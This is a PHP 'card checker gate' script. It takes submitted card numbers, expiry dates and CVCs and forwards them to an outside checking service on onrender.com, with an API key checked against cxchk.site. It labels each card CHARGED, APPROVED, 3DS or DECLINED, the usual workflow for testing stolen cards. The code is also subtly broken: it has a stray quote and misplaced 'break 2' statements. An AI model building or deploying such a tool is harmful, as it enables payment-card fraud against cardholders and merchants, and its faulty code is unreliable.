<?php
// /gate/authnet1$.php - Updated with proper API key validation via validkey.php

// Disable error reporting for production
ini_set('display_errors', 0);
ini_set('display_startup_errors', 0);
error_reporting(0);

// === API KEY VALIDATION ===
// Extract API key from X-API-KEY header
$apiKey = $_SERVER['HTTP_X_API_KEY'] ?? '';

// Validate using validkey.php (same directory)
$validationContext = stream_context_create([
    'http' => [
        'method' => 'GET',
        'header' => "X-API-KEY: $apiKey\r\n"
    ]
]);

$validationResponse = @file_get_contents('http://cxchk.site/gate/validkey.php', false, $validationContext);
$validation = json_decode($validationResponse, true);

if (!$validation || !$validation['valid']) {
    http_response_code(401); // Unauthorized
    echo json_encode([
        'status' => 'ERROR',
        'message' => 'Invalid or expired API key: ' . ($validation['error'] ?? 'Validation failed')
    ]);
    exit;
}

// === CARD DATA VALIDATION ===
if (!isset($_POST['card']['number'], $_POST['card']['exp_month'], $_POST['card']['exp_year'], $_POST['card']['cvc'])) {
    echo json_encode(['status' => 'DECLINED', 'message' => 'Missing card parameters']);
    exit;
}

// Extract card details
$card_number = trim($_POST['card']['number']);
$exp_month = str_pad($_POST['card']['exp_month'], 2, '0', STR_PAD_LEFT); // Ensure MM format
$exp_year = $_POST['card']['exp_year'];
$cvc = trim($_POST['card']['cvc']);

// Basic card validation
if (!is_numeric($card_number) || strlen($card_number) < 13 || strlen($card_number) > 19) {
    echo json_encode(['status' => 'DECLINED', 'message' => 'Invalid card number format']);
    exit;
}

if (!is_numeric($exp_month) || $exp_month < 1 || $exp_month > 12) {
    echo json_encode(['status' => 'DECLINED', 'message' => 'Invalid expiration month']);
    exit;
}

if (!is_numeric($cvc) || (strlen($cvc) !== 3 && strlen($cvc) !== 4)) {
    echo json_encode(['status' => 'DECLINED', 'message' => 'Invalid CVC format']);
    exit;
}

// Normalize exp_year to 4 digits if it's 2 digits (YY)
if (strlen($exp_year) === 2) {
    $current_year = intval(date('Y')) % 100;
    $input_year = intval($exp_year);
    if ($input_year < 50) {
        $exp_year = '20' . $exp_year;
    } else {
        $exp_year = '19' . $exp_year;
    }
} elseif (strlen($exp_year) !== 4 || !is_numeric($exp_year)) {
    echo json_encode(['status' => 'DECLINED', 'message' => 'Invalid year format']);
    exit;
}

// Check if card is expired
$current_time = time();
$card_expiry = mktime(0, 0, 0, $exp_month, 1, $exp_year);
if ($current_time > $card_expiry) {
    echo json_encode(['status' => 'DECLINED', 'message' => 'Card expired']);
    exit;
}

// Format cc string: number|month|year|cvc
$cc = $card_number . '|' . $exp_month . '|' . $exp_year . '|' . $cvc';

// API URL
$api_url_base = 'https://rockyalways.onrender.com/gateway=authnet1$/key=rockysoon?cc=';

// === PARALLEL REQUEST FUNCTION ===
function makeRequest($url) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // For Render.com SSL
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (compatible; CardChecker/1.0)');
    $response = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $error = curl_error($ch);
    curl_close($ch);
    
    if ($error) {
        error_log("CURL Error: $error for URL: $url");
        return false;
    }
    
    if ($http_code !== 200) {
        error_log("HTTP $http_code response for URL: $url");
        return false;
    }
    
    return $response;
}

// === PARALLEL PROCESSING ===
$responses = [];
$multi_handle = curl_multi_init();
$channels = [];

for ($i = 0; $i < 3; $i++) {
    $url = $api_url_base . urlencode($cc) . '&attempt=' . $i . '&rand=' . mt_rand(1000, 9999);
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (compatible; CardChecker/1.0)');
    curl_multi_add_handle($multi_handle, $ch);
    $channels[$i] = $ch;
}

// Execute parallel requests
$active = null;
do {
    curl_multi_exec($multi_handle, $active);
    curl_multi_select($multi_handle); // Wait for activity
} while ($active > 0);

foreach ($channels as $i => $ch) {
    $response = curl_multi_getcontent($ch);
    if ($response !== false && !empty($response)) {
        $responses[$i] = $response;
    }
    curl_multi_remove_handle($multi_handle, $ch);
}
curl_multi_close($multi_handle);

// === PROCESS RESPONSES ===
$best_response = ['status' => 'DECLINED', 'message' => 'All attempts failed'];
$valid_responses = 0;

foreach ($responses as $response) {
    if ($response !== false && !empty($response)) {
        $data = json_decode($response, true);
        if (json_last_error() === JSON_ERROR_NONE && isset($data['message'], $data['status'])) {
            $best_response = $data;
            $valid_responses++;
            // Break if we want first valid, or continue for best match
            break; // Take first valid response
        } else {
            // Try to parse as plain text
            $data = ['status' => 'DECLINED', 'message' => trim($response)];
            $best_response = $data;
        }
    }
}

if ($valid_responses === 0) {
    echo json_encode(['status' => 'DECLINED', 'message' => 'No valid responses from gateway']);
    exit;
}

// === STATUS CLASSIFICATION LOGIC ===
$message = $best_response['message'] ?? 'Unknown error';
$api_status = $best_response['status'] ?? 'UNKNOWN';

// Clean and lowercase message for comparison
$message_lower = strtolower(trim(strip_tags($message)));

// Define comprehensive phrase arrays
$charged_phrases = [
    'transaction approved',
    'payment successful',
    'transaction complete',
    'approved',
    'success',
    'payment processed',
    'thank you for your payment',
    'authorization approved',
    'transaction successful',
    'payment authorized',
    'charge successful',
    'approved -',
    'response: 1', // Auth.net code 1 = Approved
    'response: approved'
];

$approved_phrases = [
    'cvv',
    'card code',
    'security code',
    'cvv2',
    'cvc',
    'cvv does not match',
    'security code',
    'issue with security code',
    'security code verification',
    'cvc verification',
    'card verification code'
];

$three_ds_phrases = [
    '3d secure',
    '3ds',
    'three d secure',
    'secure authentication',
    'additional verification',
    'redirect to',
    'authentication required',
    '3-d secure',
    '3d verification'
];

$declined_phrases = [
    'failed',
    'declined',
    'transaction declined',
    'card declined',
    'insufficient funds',
    'invalid card',
    'expired card',
    'this transaction has been declined',
    'do not honor',
    'insufficient funds',
    'invalid merchant',
    'response: 2', // Auth.net code 2 = Declined
    'response: declined'
];

// Determine status with priority: CHARGED > 3DS > APPROVED > DECLINED
$our_status = 'DECLINED';

// Priority 1: Check for CHARGED
foreach ($charged_phrases as $phrase) {
    if (strpos($message_lower, $phrase) !== false) {
        $our_status = 'CHARGED';
        break 2; // Break both loops
    }
}

// Priority 2: Check for 3DS
if ($our_status === 'DECLINED') {
    foreach ($three_ds_phrases as $phrase) {
        if (strpos($message_lower, $phrase) !== false) {
            $our_status = '3DS';
            break 2;
        }
    }
}

// Priority 3: Check for APPROVED (CVV related)
if ($our_status === 'DECLINED') {
    foreach ($approved_phrases as $phrase) {
        if (strpos($message_lower, $phrase) !== false) {
            $our_status = 'APPROVED';
            break 2;
        }
    }
}

// Priority 4: Confirm DECLINED
if ($our_status === 'DECLINED') {
    foreach ($declined_phrases as $phrase) {
        if (strpos($message_lower, $phrase) !== false) {
            $our_status = 'DECLINED';
            break;
        }
    }
}

// === PREPARE OUTPUT ===
$our_message = $message;
if ($api_status && $api_status !== 'UNKNOWN') {
    $our_message .= ' (' . strtoupper($api_status) . ')';
}

// Add timestamp for debugging
$our_message .= ' [Processed: ' . date('Y-m-d H:i:s') . ']';

// === OUTPUT JSON RESPONSE ===
header('Content-Type: application/json');
echo json_encode([
    'status' => $our_status,
    'message' => $our_message,
    'raw_response' => $best_response, // For debugging
    'processed_at' => date('Y-m-d H:i:s')
]);
?>
